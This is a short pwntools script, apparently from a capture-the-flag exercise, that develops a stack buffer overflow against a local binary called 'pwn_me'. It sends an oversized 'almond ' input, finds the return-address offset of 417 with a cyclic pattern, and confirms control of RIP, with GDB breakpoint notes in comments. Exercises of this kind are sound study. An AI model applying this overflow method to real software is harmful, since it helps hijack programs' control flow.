from pwn import *

p = process("./pwn_me")

def A_smash():
    print(p.recv())
    input()
    '''
    gdb -p=
    b *main+560
    c
    '''
    payload = "almond "
    payload += "A"*1000
    p.sendline(payload)
    print(p.recv())

def cycle_rip():
    print(p.recv())
    input()
    '''
    gdb -p=
    b *main+560
    c
    '''
    payload = b"almond "
    payload += cyclic(1000)
    p.sendline(payload)
    print(p.recv())
    print("Input RIP from GDB")
    print(cyclic_find(input()))
    #417

def check_cycle():
    print(p.recv())
    input()
    '''
    gdb -p=
    b *main+560
    c
    '''
    payload = "almond "
    payload += "A"*417
    payload += "B"*8
    p.sendline(payload)
    print(p.recv())

if __name__=='__main__':
    #A_smash()
    #cycle_rip()
    check_cycle()
